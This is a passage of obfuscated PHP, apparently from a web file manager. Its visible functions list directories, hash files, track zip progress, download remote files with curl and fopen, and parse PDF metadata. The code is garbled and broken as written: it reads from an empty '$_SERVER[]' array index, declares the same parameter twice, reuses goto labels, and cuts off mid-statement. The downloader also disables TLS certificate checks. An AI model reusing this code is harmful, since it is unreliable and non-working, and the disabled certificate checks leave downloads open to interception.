=> $E, $b[75] => $this->getPathOuter($d悰), $b[29] => $b[76]); } $Dį = array($b[28] => $E, $b[75] => $this->getPathOuter($d悰), $b[29] => $b[76], $b[187] => @filectime($d悰), $b[107] => @filemtime($d悰), $b[1170] => @fileatime($d悰), $b[1164] => is_readable($d悰), $b[1165] => is_writable($d悰), $b[1171] => get_mode($d悰)); return $Dį; } private function fileInfo($CΏд, $AՇ = false) { $Fͮٻ =& $_SERVER[]; $F = $this->iconvApp($this->pathThis($CΏд)); if ($AՇ) { return array($Fͮٻ[28] => $F, $Fͮٻ[75] => $this->getPathOuter($CΏд), $Fͮٻ[29] => $Fͮٻ[167], $Fͮٻ[77] => $this->size($CΏд), $Fͮٻ[160] => $this->ext($F)); } $fŶ = array($Fͮٻ[28] => $F, $Fͮٻ[75] => $this->getPathOuter($CΏд), $Fͮٻ[29] => $Fͮٻ[167], $Fͮٻ[187] => @filectime($CΏд), $Fͮٻ[107] => @filemtime($CΏд), $Fͮٻ[1170] => @fileatime($CΏд), $Fͮٻ[77] => $this->size($CΏд), $Fͮٻ[160] => $this->ext($F), $Fͮٻ[1164] => is_readable($CΏд), $Fͮٻ[1165] => is_writable($CΏд), $Fͮٻ[1171] => get_mode($CΏд)); return $fŶ; } public function exist($E됏) { $E됏 = $this->iconvSystem($E됏); return @file_exists($E됏); } public function isFile($C򾝡) { $C򾝡 = $this->iconvSystem($C򾝡); return @is_file($C򾝡); } public function isFolder($aӗ) { $aӗ = $this->iconvSystem($aӗ); return @is_dir($aӗ); } public function listPath($f̈, $F = false) { goto c; b: closedir($fӉ); return $f媪; goto a; c: $f嚎 =& $_SERVER[]; $f̈ = $this->iconvSystem($f̈); $f̈ = rtrim($f̈, $f嚎[8]) . $f嚎[8]; goto Cپ; Cپ: $f媪 = array($f嚎[74] => array(), $f嚎[73] => array()); if (!($fӉ = @opendir($f̈))) { return $f媪; } while (($eˌ = readdir($fӉ)) !== !1) { if ($eˌ == $f嚎[91] || $eˌ == $f嚎[1167]) { continue; } $B摍 = $f̈ . $eˌ; if (is_file($B摍)) { $f媪[$f嚎[73]][] = $this->fileInfo($B摍, $F); } else { $f媪[$f嚎[74]][] = $this->folderInfo($B摍, $F); } } goto b; a: } public function listAll($bɋɋ, &$Dض = array()) { goto bɊ; FƧȼ: return $Dض; goto fĹ͜; bɊ: $fł =& $_SERVER[]; $bɋɋ = $this->iconvSystem($bɋɋ); $bɋɋ = rtrim($bɋɋ, $fł[8]) . $fł[8]; goto aœӣ; aœӣ: if (!($A = @opendir($bɋɋ))) { return $Dض; } while (($F = readdir($A)) !== !1) { if ($F == $fł[91] || $F == $fł[1167]) { continue; } $Bǈ = $bɋɋ . $F; if (is_dir($Bǈ) && !is_link($Bǈ)) { $Dض[] = array($fł[75] => $Bǈ . $fł[8], $fł[76] => 1, $fł[107] => @filemtime($Bǈ), $fł[77] => 0); $this->listAll($Bǈ, $Dض); } else { $Dض[] = array($fł[75] => $Bǈ, $fł[76] => 0, $fł[107] => @filemtime($Bǈ), $fł[77] => $this->size($Bǈ)); } } closedir($A); goto FƧȼ; fĹ͜: } public function has($Bƍ, $bڬ = false, $CǌÙ = true) { goto e; e: $bŊ =& $_SERVER[]; $Bƍ = $this->iconvSystem($Bƍ); $Bƍ = rtrim($Bƍ, $bŊ[8]) . $bŊ[8]; goto A񊯰; a: if ($bڬ) { return array($bŊ[191] => $aߝ, $bŊ[192] => $cώ܂); } return !1; goto Cȗˆ; A񊯰: if (!($bۂͨ = @opendir($Bƍ))) { return !1; } $aߝ = 0; $cώ܂ = 0; goto C쫐; C쫐: $A̼ = 0; while (($dҋ = readdir($bۂͨ)) !== !1) { if ($dҋ == $bŊ[91] || $dҋ == $bŊ[1167]) { continue; } $f = $Bƍ . $dҋ; if ($bڬ) { $A̼++; if (@is_file($f)) { $aߝ++; } else { $cώ܂++; } if ($A̼ > 10000) { break; } continue; } if ($CǌÙ) { if (@is_file($f)) { return !0; } } else { if (@is_dir($f . $bŊ[8])) { return !0; } } } closedir($bۂͨ); goto a; Cȗˆ: } public function hashSimple($D) { goto b԰; b좛: return md5($b) . $D٥Ã; goto fѱ; c˳: fseek($fҕ, $D٥Ã - $f냊); $b .= fread($fҕ, $f냊); fclose($fҕ); goto b좛; b԰: $c =& $_SERVER[]; if (!$D) { return md5($c[33]); } $D = $this->iconvSystem($D); goto Dč; Dč: $D٥Ã = $this->size($D); $f냊 = 200; $D쟊 = 50; goto F춴; F춴: if ($D٥Ã <= $f냊 * $D쟊) { return $this->hashMd5($D) . $D٥Ã; } $b = $c[33]; $aՠ = intval($D٥Ã / $D쟊); goto EЍ; EЍ: $fҕ = fopen($D, $c[1172]); if (!$fҕ) { return $b; } for ($B = 0; $B < $D쟊; $B++) { fseek($fҕ, $aՠ * $B); $b .= fread($fҕ, $f냊); } goto c˳; fѱ: } public function getContent($d֯Ȗ) { $d֯Ȗ = $this->iconvSystem($d֯Ȗ); return file_get_contents($d֯Ȗ); } public function setContent($F, $F = '') { $F = $this->iconvSystem($F); @file_put_contents($F, $F, LOCK_EX); clearstatcache(); return strlen($F) == filesize($F); } public function fileSubstr($Aʂ݋, $cԇ = 0, $F = false) { goto Bꎏ; dҚ: return $F҄; goto B̻; cό: fseek($EԞ, $cԇ); $F҄ = fread($EԞ, $F); fclose($EԞ); goto dҚ; cۨ: if ($F <= 0) { return $dҌ[33]; } $EԞ = fopen($Aʂ݋, $dҌ[1172]); if (!$EԞ) { return !1; } goto cό; Bꎏ: $dҌ =& $_SERVER[]; $Aʂ݋ = $this->iconvSystem($Aʂ݋); if ($F === !1) { $F = $this->size($Aʂ݋); } goto cۨ; B̻: } public function upload($e, $d蔊ě, $d廌 = false, $bϾ = REPEAT_REPLACE) { $C = $this->copyFile($d蔊ě, $e); return $C ? $this->getPathOuter($e) : !1; } public function setModifyTime($b兪, $dƹȠ = '') { @touch($b兪, intval($dƹȠ)); } public function download($c͍, $d) { return $this->iconvSystem($c͍); } } goto Aݻ; Aҧ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $D =& $_SERVER[]; parent::startAfter(); Hook::bind($D[1513], array($this, $D[1508])); $cƵ =& $this->task; $cƵ[$D[1510]] = $D[1042]; if (!$cƵ[$D[1343]]) { $cƵ[$D[1343]] = LNG($D[1514]); } } protected function endAfter() { $Aڣ̸ =& $_SERVER[]; parent::endAfter(); Hook::unbind($Aڣ̸[1513], array($this, $Aڣ̸[1508])); } public function updateAfter() { $D΂샹 =& $_SERVER[]; $d⠡ =& $this->task; if (!$d⠡[$D΂샹[978]] || !$d⠡[$D΂샹[697]]) { return; } if ($d⠡[$D΂샹[1510]] == $D΂샹[1042]) { $aը = $d⠡[$D΂샹[1483]]; if ($d⠡[$D΂샹[1484]] != $D΂샹[1042]) { $aը = 0; } $eӿք = ($d⠡[$D΂샹[1487]] + $aը) / $d⠡[$D΂샹[697]]; $d⠡[$D΂샹[1438]] = $eӿք * 0.3; } else { if ($d⠡[$D΂샹[1510]] == $D΂샹[301]) { $eӿք = $d⠡[$D΂샹[992]] / $d⠡[$D΂샹[978]]; $d⠡[$D΂샹[1438]] = 0.3 + $eӿք * 0.5; } else { if ($d⠡[$D΂샹[1510]] == $D΂샹[103]) { $eӿք = 0; if ($d⠡[$D΂샹[1482]]) { $eӿք = $d⠡[$D΂샹[1483]] / $d⠡[$D΂샹[1482]]; } $d⠡[$D΂샹[1438]] = 0.3 + 0.5 + $eӿք * 0.2; } } } if ($d⠡[$D΂샹[1438]] > 0) { $b = timeFloat() - $d⠡[$D΂샹[1440]] - $d⠡[$D΂샹[1443]]; $d⠡[$D΂샹[1444]] = $b * (1 - $d⠡[$D΂샹[1438]]) / $d⠡[$D΂샹[1438]]; } } public function copyFileStart($c؈, $D, $Fݖ, $b, $F, $Cφ) { $E鲵 =& $_SERVER[]; parent::copyFileStart($c؈, $D, $Fݖ, $b, $F, $Cφ); $Fʟ޳ =& $this->task; if ($Fʟ޳[$E鲵[1510]] == $E鲵[301]) { $Fʟ޳[$E鲵[1510]] = $E鲵[103]; } $this->update(); } public function copyFileEnd($A, $aޕ, $B, $BҲ, $c߯, $Dڳ) { $c =& $_SERVER[]; $Bύ =& $this->task; $Bύ[$c[1483]] = $Bύ[$c[1482]]; $Bύ[$c[1487]] += $Bύ[$c[1482]]; $Bύ[$c[1484]] = $c[33]; $this->update(); } public function nameParse($FĲܢ) { $EȌ =& $_SERVER[]; $Aфۺ =& $this->task; if ($Aфۺ[$EȌ[992]] < $Aфۺ[$EȌ[978]]) { $E = get_path_this($FĲܢ); if (strstr($E, $EȌ[91])) { $Aфۺ[$EȌ[992]] += 1; } } if ($Aфۺ[$EȌ[1510]] == $EȌ[1042]) { $Aфۺ[$EȌ[1510]] = $EȌ[301]; } $Aфۺ[$EȌ[1480]] = $FĲܢ; $this->update(); } } class Downloader { static function start($Cߍ, $A˻, $aԼ = 10) { goto B; f̳: if (is_file($a)) { $E㋓ε = file_get_contents($a); $Bҿ = json_decode($E㋓ε, 1); } if (file_exists($A˻) && $aĦ == filesize($A˻)) { @unlink($AØԛ); @unlink($a); return array($C䟏[1034] => !0, $C䟏[1036] => $C䟏[1518]); } if ($Bҿ[$C䟏[325]] != $aĦ) { $Bҿ = array($C䟏[325] => $aĦ); } goto aӌ؛; a쒯: $aĦ = intval($dǉ[$C䟏[325]]); if (file_exists($AØԛ) && time() - filemtime($AØԛ) < 3) { return array($C䟏[1034] => !1, $C䟏[1036] => $C䟏[1517]); } $Bҿ = array(); goto f̳; B: $C䟏 =& $_SERVER[]; if (!request_url_safe($Cߍ)) { return array($C䟏[1034] => !1, $C䟏[1036] => $C䟏[1039]); } $a = $A˻ . $C䟏[1515]; goto E; aӌ؛: if ($cԙ > $aĦ) { @unlink($AØԛ); } file_put_contents($a, json_encode($Bҿ)); $Aף = self::fileDownloadCurl($Cߍ, $A˻, !0, $cԙ, $aĦ); goto e; e: if ($Aף[$C䟏[1034]]) { @unlink($a); } return $Aף; goto Aˈ눑; E: $AØԛ = $A˻ . $C䟏[1516]; if (is_array($Cߍ)) { $dǉ = $Cߍ; } else { $dǉ = url_header($Cߍ); } $Cߍ = $dǉ[$C䟏[295]]; goto F; F: if (!$Cߍ) { return array($C䟏[1034] => !1, $C䟏[1036] => $C䟏[1039]); } if (!$dǉ[$C䟏[1290]] || $dǉ[$C䟏[325]] == 0) { @unlink($AØԛ); @unlink($A˻); $Aף = self::fileDownloadFopen($Cߍ, $A˻, $dǉ[$C䟏[325]]); if ($Aף[$C䟏[1034]]) { return $Aף; } else { @unlink($AØԛ); @unlink($A˻); $Aף = self::fileDownloadCurl($Cߍ, $A˻, !1, 0, $dǉ[$C䟏[325]]); @unlink($AØԛ); return $Aף; } } $cԙ = is_file($AØԛ) ? filesize($AØԛ) : 0; goto a쒯; Aˈ눑: } static function fileDownloadFopen($cƖ, $c, $fޣ = 0) { $a =& $_SERVER[]; @ini_set($a[1519], $a[1520]); $eņ = $c . $a[1516]; set_timeout(); @unlink($eņ); if ($dʷɅ = @fopen($cƖ, $a[1521])) { goto fٯ; e: return array($a[1034] => !0, $a[1036] => $a[695]); goto d; fٯ: if (!($e = @fopen($eņ, $a[1522]))) { return array($a[1034] => !1, $a[1036] => $a[1523]); } while (!feof($dʷɅ)) { if (!file_exists($eņ)) { fclose($e); return array($a[1034] => !1, $a[1036] => $a[1524]); } clearstatcache(); if ($fޣ > 0 && $fޣ == filesize(iconv_system($eņ))) { break; } fwrite($e, fread($dʷɅ, 1024 * 8), 1024 * 8); } fclose($e); goto d״Τ͝; d״Τ͝: fclose($dʷɅ); self::checkGzip($eņ); if (!@rename($eņ, $c)) { usleep(round(rand(0, 1000) * 50)); @unlink($c); $d = @rename($eņ, $c); if (!$d) { return array($a[1034] => !1, $a[1036] => $a[1525]); } } goto e; d: } else { return array($a[1034] => !1, $a[1036] => $a[1526]); } } static function fileDownloadCurl($E, $F֜, $D̿ = false, $f = 0, $fϑ = 0) { goto Dӈ; c䚟: $e = @fopen($F㗸, $e߂օ[982]); if (!$e) { return array($e߂օ[1034] => !1, $e߂օ[1036] => $e߂օ[1527]); } $b = curl_init($E); goto E; c֛ǜ: curl_setopt($b, CURLOPT_USERAGENT, $e߂օ[1520]); $f = curl_exec($b); curl_progress_end($b); goto D; Dӈ: $e߂օ =& $_SERVER[]; $F㗸 = $F֜ . $e߂օ[1516]; set_timeout(); goto c䚟; D: curl_setopt($b, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($b, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($b, CURLOPT_SSL_VERIFYHOST, 0); goto f; f: curl_setopt($b, CURLOPT_NOPROGRESS, !1); curl_setopt($b, CURLOPT_PROGRESSFUNCTION, $e߂օ[1528]); curl_progress_start($b); goto c֛ǜ; E: if ($D̿) { curl_setopt($b, CURLOPT_RANGE, $f . $e߂օ[714]); } curl_setopt($b, CURLOPT_FILE, $e); curl_setopt($b, CURLOPT_REFERER, get_url_link($E)); goto D; D푳: if ($F渟 < $fϑ && $fϑ != 0) { return array($e߂օ[1034] => !1, $e߂օ[1036] => $e߂օ[1517]); } if ($f && filesize($F㗸) != 0) { self::checkGzip($F㗸); if (!@rename($F㗸, $F֜)) { @unlink($F֜); $f = @rename($F㗸, $F֜); if (!$f) { return array($e߂օ[1034] => !1, $e߂օ[1036] => $e߂օ[1529]); } } return array($e߂օ[1034] => !0, $e߂օ[1036] => $e߂օ[695]); } return array($e߂օ[1034] => !1, $e߂օ[1036] => $e߂օ[1530]); goto c; D: curl_close($b); fclose($e); $F渟 = filesize(iconv_system($F㗸)); goto D푳; c: } static function checkGzip($eÓ) { goto eۅ; fב: file_put_contents($eÓ, $dխІ); goto f轮; eۅ: $D⏭Ԧ = $_SERVER[][1531]; $b = file_sub_str($eÓ, 0, 2); if ($D⏭Ԧ != $b) { return; } goto dõ; dõ: ob_start(); readgzfile($eÓ); $dխІ = ob_get_clean(); goto fב; f轮: } } class FileParsePdf { public static function parse($DϨ) { goto b; aŹ: if ($Dظ) { $aħ[$a[1342]] = $Dظ[1]; } $aħ[$a[1540]] = 0; $f = $a[1541]; goto a; F: if ($E܋) { $a铠 = $E܋[$a[1535]][$a[1194]]; $aħ = self::getObjectValue($E, $E܋, $a铠); } $aħ = is_array($aħ) ? $aħ : array(); $aħ[$a[1536]] = 0; goto bא; a·Ɗ: if ($Dظ[1] && $aħ[$a[1540]] < $Dظ[1][0]) { $aħ[$a[1540]] = $Dظ[1][0]; } $aħ = self::parseInfoItem($aħ); return $aħ; goto Bƻ; b: $a =& $_SERVER[]; $eٺ = 32 * 1024; $E = array($a[775] => fopen($DϨ, $a[1172]), $a[75] => $DϨ, $a[77] => filesize($DϨ), $a[1532] => $eٺ); goto c氃; a: preg_match_all($f, $E[$a[1533]], $Dظ); if ($Dظ[1] && $aħ[$a[1540]] < $Dظ[1][0]) { $aħ[$a[1540]] = $Dظ[1][0]; } preg_match_all($f, $E[$a[1534]], $Dظ); goto a·Ɗ; c氃: $E[$a[1533]] = StreamWrapperIO::read($DϨ, 0, $eٺ); $E[$a[1534]] = StreamWrapperIO::read($DϨ, $E[$a[77]] - $eٺ, $eٺ); $E܋ = self::decodeXref($E); goto F; bא: $f = $a[1537]; preg_match($f, $E[$a[1533]], $Dظ); if (!$aħ[$a[1536]] && count($Dظ) == 5) { $aħ[$a[1536]] = $Dظ[3]; $aħ[$a[1538]] = $Dظ[4]; } goto F; F: preg_match($f, $E[$a[1534]], $Dظ); if (!$aħ[$a[1536]] && count($Dظ) == 5) { $aħ[$a[1536]] = $Dظ[3]; $aħ[$a[1538]] = $Dظ[4]; } preg_match($a[1539], $E[$a[1533]], $Dظ); goto aŹ; Bƻ: } private static function parseInfoItem($c) { $Bڿ =& $_SERVER[]; if (!$c) { return !1; } $fƊ = array($Bڿ[1343] => array($Bڿ[1542], $Bڿ[33]), $Bڿ[1543] => array($Bڿ[1544], $Bڿ[33]), $Bڿ[187] => array($Bڿ[1545], $Bڿ[210]), $Bڿ[107] => array($Bڿ[1546], $Bڿ[210]), $Bڿ[1540] => array($Bڿ[1540], $Bڿ[276]), $Bڿ[1536] => array($Bڿ[1536], $Bڿ[276]), $Bڿ[1538] => array($Bڿ[1538], $Bڿ[276]), $Bڿ[1547] => array($Bڿ[1548], $Bڿ[33]), $Bڿ[1549] => array($Bڿ[1550], $Bڿ[33]), $Bڿ[1551] => array($Bڿ[1342], $Bڿ[33])); $b٪ = array(); foreach ($fƊ as $Dϳ => $D戄) { if (!isset($c[$D戄[0]])) { continue; } $eʑ = $c[$D戄[0]]; if (!$eʑ || is_array($eʑ)) { continue; } switch ($D戄[1]) { case $Bڿ[276]: $eʑ = intval($eʑ); break; case $Bڿ[210]: if (substr($eʑ, 0, 2) == $Bڿ[1552]) { $eʑ = substr($eʑ, 2, 14); } if (strtotime($eʑ)) { $eʑ = date($Bڿ[1553], strtotime($eʑ)); } break; } $b٪[$Dϳ] = $eʑ; } return $b٪; } private static function decodeXref(&$cʃ) { goto fڄ; A: if (preg_match($AΟƊ[1566], $bɖ, $FÖ) > 0) { $Dݥ[$AΟƊ[1535]][$AΟƊ[1194]] = intval($FÖ[1]) . $AΟƊ[70] . intval($FÖ[2]); } if (preg_match($AΟƊ[1567], $bɖ, $FÖ) > 0) { $Dݥ[$AΟƊ[1535]][$AΟƊ[367]] = array(); $Dݥ[$AΟƊ[1535]][$AΟƊ[367]][0] = $FÖ[1]; $Dݥ[$AΟƊ[1535]][$AΟƊ[367]][1] = $FÖ[2]; } if (!$Dݥ[$AΟƊ[1535]][$AΟƊ[1194]]) { return !1; } goto e๸; fڄ: $AΟƊ =& $_SERVER[]; $f = $cʃ[$AΟƊ[1534]]; $Dݥ = array($AΟƊ[1535] => array(), $AΟƊ[1554] => array()); goto e鎋; b: if (preg_match($AΟƊ[1561], $bɖ, $FÖ) > 0) { $Dݥ[$AΟƊ[1535]][$AΟƊ[77]] = intval($FÖ[1]); } if (preg_match($AΟƊ[1562], $bɖ, $FÖ) > 0) { $Dݥ[$AΟƊ[1535]][$AΟƊ[1563]] = intval($FÖ[1]) . $AΟƊ[70] . intval($FÖ[2]); } if (preg_match($AΟƊ[1564], $bɖ, $FÖ) > 0) { $Dݥ[$AΟƊ[1535]][$AΟƊ[1565]] = intval($FÖ[1]) . $AΟƊ[70] . intval($FÖ[2]); } goto A; cސ: foreach ($FÖ[3] as $E => $f) { if ($FÖ[3][$E] == $AΟƊ[1557]) { $D = $f¡ϸ . $AΟƊ[70] . intval($FÖ[2][$E]); $Dݥ[$AΟƊ[1554]][$D] = intval($FÖ[1][$E]); ++$f¡ϸ; } else { if ($FÖ[3][$E] == $AΟƊ[1558]) { ++$f¡ϸ; } else { } } } if (preg_match_all($AΟƊ[1559], $f, $FÖ)) { $D = $cʃ[$AΟƊ[77]] - $cʃ[$AΟƊ[1532]]; foreach ($FÖ[0] as $E => $fڥԶ) { $fǸ = $FÖ[1][$E] . $AΟƊ[70] . $FÖ[2][$E]; $Dݥ[$AΟƊ[1554]][$fǸ] = strpos($f, $fڥԶ) + $D + 1; } } if (preg_match_all($AΟƊ[1560], $f, $FÖ)) { $bɖ = count($FÖ[1]) == 1 ? $FÖ[1][0] : $FÖ[1][1]; } else { $bɖ = substr($f, -1024 * 5); } goto b; e๸: if (preg_match($AΟƊ[1568], $bɖ, $FÖ) > 0) { } return $Dݥ; goto eټ; e鎋: $cʼ = $AΟƊ[1555]; if (!preg_match_all($cʼ, $f, $FÖ, PREG_SET_ORDER, 0)) { return !1; } $fڭ = intval($FÖ[0][1]); goto B; B: if ($cʃ[$AΟƊ[77]] - $fڭ > $cʃ[$AΟƊ[1532]]) { $Cݸ = 4 * $cʃ[$AΟƊ[1532]]; $cʃ[$AΟƊ[1532]] = $Cݸ; $cʃ[$AΟƊ[1533]] = StreamWrapperIO::read($cʃ[$AΟƊ[75]], 0, $Cݸ); $cʃ[$AΟƊ[1534]] = StreamWrapperIO::read($cʃ[$AΟƊ[75]], $cʃ[$AΟƊ[77]] - $Cݸ, $Cݸ); $f = $cʃ[$AΟƊ[1534]]; } $f¡ϸ = 0; preg_match_all($AΟƊ[1556], $f, $FÖ); goto cސ; eټ: } private static function getObjectValue($BИ, $DنР, $e) { goto bɒ; D踟: if (!is_array($DԲ[1])) { return array(); } $dÏ = array(); for ($F = 0; $F < count($DԲ[1]); $F += 2) { $F = $DԲ[1][$F]; $bϔ = $DԲ[1][$F + 1]; if (count($F) == 3 && $F[0] == $a׏[8]) { $e = !1; if ($bϔ[0] == $a׏[1569]) { $bϔ = self::getObject($BИ, $DنР[$a׏[1554]][$bϔ[1]]); } $e = $bϔ[1]; if ($e === !1) { continue; } if (is_string($e)) { $e = self::decodeStr($e); } $dÏ[$F[1]] = $e; } } goto Cۘ; Cۘ: return $dÏ; goto AɇŬ; bɒ: $a׏ =& $_SERVER[]; $DԲ = self::getObject($BИ, $DنР[$a׏[1554]][$e]); if (is_string($DԲ[1])) { return $DԲ[1]; } goto D踟; AɇŬ: } private static function getObject($Dʃۜ, $bס) { $D = self::getObjectItem($Dʃۜ, $bס); $D = self::getObjectItem($Dʃۜ, $D[2]); return $D; } private static function getObjectItem($Dϭ, $CƮ) { goto Eϴ; Eϴ: $b饎 =& $_SERVER[]; $A = $Dϭ[$b饎[1532]]; $D = $Dϭ[$b饎[77]] - $A; goto aȞ; A: $Cߎ = self::getRawObject($DЧ, $fᘳ); if ($CƮ >= $D) { $Cߎ[2] = $Cߎ[2] + $D; } else { if ($CƮ > $A && $CƮ <= $D) { $Cߎ[2] = $Cߎ[2] + $CƮ; } } return $Cߎ; goto F֧; aȞ: $fᘳ = $CƮ >= $D ? $CƮ - $D : $CƮ; $DЧ = $CƮ >= $D ? $Dϭ[$b饎[1534]] : $Dϭ[$b饎[1533]]; if ($CƮ > $A && $CƮ <= $D) { $fᘳ = 0; $DЧ = StreamWrapperIO::read($Dϭ[$b饎[75]], $CƮ, $A); } goto A; F֧: } private static function decodeStr($Fڑ) { goto f; f: $e۬ =& $_SERVER[]; $Fڑ = str_replace(array($e۬[1570], $e۬[1571], $e۬[1572], $e۬[1573], $e۬[1574], $e۬[1575], $e۬[1576], $e۬[1577]), array($e۬[93], $e۬[50], $e۬[8], $e۬[248], $e۬[818], $e۬[217], $e۬[994], $e۬[330]), $Fڑ); $d؋𡤂 = preg_split($e۬[1578], $Fڑ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto C; aѮ: $Fڑ = $e۬[33]; foreach ($d؋𡤂 as $e) { if (preg_match($e۬[1584], $e) && !1 === stripos($e, $e۬[1585])) { $e = preg_replace($e۬[1586], $e۬[33], $e); $e = trim($e, $e۬[927]); $e = pack($e۬[1587], $e); $Fڑ .= $e; } else { $Fڑ .= $e; } } if (preg_match($e۬[1588], $Fڑ)) { $DԐ = substr($Fڑ, 2); $Fڑ = $e۬[33]; $fÛϐ = strlen($DԐ); for ($E̅ͽ = 0; $E̅ͽ < $fÛϐ; $E̅ͽ += 2) { $e = hexdec(bin2hex(substr($DԐ, $E̅ͽ, 2))); $Fڑ .= mb_convert_encoding($e۬[1589] . intval($e) . $e۬[67], $e۬[1590], $e۬[1591]); } } goto a; a: return $Fڑ; goto c隯; C: $Fڑ = $e۬[33]; foreach ($d؋𡤂 as $e) { if (preg_match($e۬[1579], $e)) { $Fڑ .= \chr(octdec(trim($e, $e۬[93]))); } else { $Fڑ .= $e; } } $d؋𡤂 = preg_split($e۬[1580], $Fڑ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto f; f: $Fڑ = $e۬[33]; foreach ($d؋𡤂 as $e) { if (preg_match($e۬[1581], $e)) { $Fڑ .= \chr(hexdec(trim($e, $e۬[1582]))); } else { $Fڑ .= $e; } } $d؋𡤂 = preg_split($e۬[1583], $Fڑ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto aѮ; c隯: } private static function getRawObject($b, $FޖĪ = 0) { goto eؠ; Dޘ: return array($EǏ, $A붾, $FޖĪ); goto f; b: $FޖĪ += strspn($b, $Aǹ[1592], $FޖĪ); $CԈ = $b[$FޖĪ]; switch ($CԈ) { case $Aǹ[1593]: $A = strcspn($b, $Aǹ[1594], $FޖĪ); if ($A > 0) { $FޖĪ += $A; return self::getRawObject($b, $FޖĪ); } break; case $Aǹ[8]: $EǏ = $CԈ; ++$FޖĪ; $aޢ = preg_match($Aǹ[1595], substr($b, $FޖĪ, 256), $Eסݰ); if (1 == $aޢ) { $A붾 = $Eסݰ[1]; $FޖĪ += strlen($A붾); } break; case $Aǹ[248]: case $Aǹ[818]: $EǏ = $CԈ; ++$FޖĪ; $Eэ = $FޖĪ; if ($Aǹ[248] == $CԈ) { $Dїއ = 1; while ($Dїއ > 0) { if (!isset($b[$Eэ])) { break; } $F楿 = $b[$Eэ]; switch ($F楿) { case $Aǹ[93]: ++$Eэ; break; case $Aǹ[248]: ++$Dїއ; break; case $Aǹ[818]: --$Dїއ; break; } ++$Eэ; } $A붾 = substr($b, $FޖĪ, $Eэ - $FޖĪ - 1); $FޖĪ = $Eэ; } break; case $Aǹ[157]: case $Aǹ[478]: $EǏ = $CԈ; ++$FޖĪ; if ($Aǹ[157] == $CԈ) { $A붾 = array(); do { $B = $FޖĪ; $fƏȔ = self::getRawObject($b, $FޖĪ); $FޖĪ = $fƏȔ[2]; $A붾[] = $fƏȔ; } while ($Aǹ[478] != $fƏȔ[0] && $FޖĪ != $B); array_pop($A붾); } break; case $Aǹ[926]: case $Aǹ[929]: if (isset($b[$FޖĪ + 1]) && $b[$FޖĪ + 1] == $CԈ) { $EǏ = $CԈ . $CԈ; $FޖĪ += 2; if ($Aǹ[926] == $CԈ) { $A붾 = array(); do { $B = $FޖĪ; $fƏȔ = self::getRawObject($b, $FޖĪ); $FޖĪ = $fƏȔ[2]; $A붾[] = $fƏȔ; } while ($Aǹ[1596] != $fƏȔ[0] && $FޖĪ != $B); array_pop($A붾); } } else { $EǏ = $CԈ; ++$FޖĪ; $aޢ = preg_match($Aǹ[1597], substr($b, $FޖĪ), $Eסݰ); if ($Aǹ[926] == $CԈ && 1 == $aޢ) { $A붾 = strtr($Eסݰ[1], $Aǹ[1598], $Aǹ[33]); $FޖĪ += \strlen($Eסݰ[0]); } elseif (!1 !== ($Eّ҇ȗ = strpos($b, $Aǹ[929], $FޖĪ))) { $FޖĪ = $Eّ҇ȗ + 1; } } break; default: if ($Aǹ[1599] == substr($b, $FޖĪ, 6)) { $EǏ = $Aǹ[1599]; $FޖĪ += 6; } elseif ($Aǹ[99] == substr($b, $FޖĪ, 4)) { $EǏ = $Aǹ[99]; $FޖĪ += 4; $A붾 = $Aǹ[99]; } elseif ($Aǹ[1600] == substr($b, $FޖĪ, 4)) { $EǏ = $Aǹ[1601]; $FޖĪ += 4; $A붾 = $Aǹ[1600]; } elseif ($Aǹ[1602] == substr($b, $FޖĪ, 5)) { $EǏ = $Aǹ[1601]; $FޖĪ += 5; $A붾 = $Aǹ[1602]; } elseif ($Aǹ[1603] == substr($b, $FޖĪ, 6)) { $EǏ = $Aǹ[1603]; $FޖĪ += 6; if (1 == preg_match($Aǹ[1604], substr($b, $FޖĪ), $Eסݰ)) { $FޖĪ += strlen($Eסݰ[0]); $eż = $Aǹ[1605]; $aޢ = preg_match($eż, substr($b, $FޖĪ), $Eסݰ, PREG_OFFSET_CAPTURE); if (1 == $aޢ) { $A붾 = substr($b, $FޖĪ, $Eסݰ[0][1]); $FޖĪ += $Eסݰ[1][1]; } } } elseif ($Aǹ[1606] == substr($b, $FޖĪ, 9)) { $EǏ = $Aǹ[1606]; $FޖĪ += 9; } elseif (1 == preg_match($Aǹ[1607], substr($b, $FޖĪ, 33), $Eסݰ)) { $EǏ = $Aǹ[1569]; $FޖĪ += strlen($Eסݰ[0]); $A붾 = intval($Eסݰ[1]) . $Aǹ[70] . intval($Eסݰ[2]); } elseif (1 == preg_match($Aǹ[1608], substr($b, $FޖĪ, 33), $Eסݰ)) { $EǏ = $Aǹ[1609]; $A붾 = intval($Eסݰ[1]) . $Aǹ[70] . intval($Eסݰ[2]); $FޖĪ += strlen($Eסݰ[0]); } elseif (($Eυ = strspn($b, $Aǹ[1610], $FޖĪ)) > 0) { $EǏ = $Aǹ[1611]; $A붾 = substr($b, $FޖĪ, $Eυ); $FޖĪ += $Eυ; } break; } goto Dޘ; eؠ: $Aǹ =& $_SERVER[]; $EǏ = $Aǹ[33]; $A붾 = $Aǹ[33]; goto b; f: } } goto fѹ; eڃ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($aٮ) { $this->pathParse = $aٮ; $this->model = Model($_SERVER[][1119]); } public function getPath($b) { return trim($b, $_SERVER[][8]); } public function pathFather($aĉˊ) { $A = $this->parse($aĉˊ); $A = $this->infoSimple($aĉˊ); return $A ? $A[$_SERVER[][463]] : !1; } public function getPathName($eתǒ) { $e = $this->infoSimple($eתǒ); return $e ? $e[$_SERVER[][28]] : !1; } public function getPathOuter($E) { if (!$E) { return $E; } $Dǚئ = $this->parse($E); return KodIO::make($Dǚئ[$_SERVER[][367]]); } public function copyFolderFromIO($aߏ, $c뼢Ǖ, $C, $cު⦟, $fÕ) { $B쇽 = $this->model->copyFolderFromIO($aߏ, $c뼢Ǖ, $C, $cު⦟, $fÕ); return KodIO::make($B쇽); } public function isParentOf($cγ, $bҖ) { return $this->model->isParentOf($cγ, $bҖ); } public function mkfile($e򱤉ϯ, $f̤Ȯ = '', $fű = REPEAT_RENAME) { $D =& $_SERVER[]; $D܌Ĉ = $this->parse($e򱤉ϯ); $e򱤉ϯ = 